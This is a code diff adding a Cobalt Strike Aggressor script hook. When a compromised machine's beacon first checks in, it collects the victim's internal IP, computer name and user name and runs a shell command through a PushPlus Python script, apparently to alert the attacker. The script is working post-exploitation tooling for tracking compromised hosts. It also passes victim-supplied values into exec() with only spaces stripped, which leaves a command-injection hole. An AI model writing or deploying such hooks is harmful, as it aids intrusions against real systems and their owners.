@@ -1,0 +1,10 @@
+on beacon_initial {
+	println("Initial Beacon Checkin: " . $1 . " PID: " . beacon_info($1,"pid"));
+	local('$internalIP $computerName $userName');
+	$internalIP = replace(beacon_info($1,"internal")," ","_");
+	$computerName = replace(beacon_info($1,"computer")," ","_");
+	$userName = replace(beacon_info($1,"user")," ","_");
+	$cmd = 'python3 /root/Cobalt_Strike_4.3_fix/CS-PushPlus-main/PushPlus.py' . " --computernam " . $computerName . " --internalip " . $internalIP . " --username " . $userName;
+	println("Sending server: " . $cmd);
+	exec($cmd);
+}
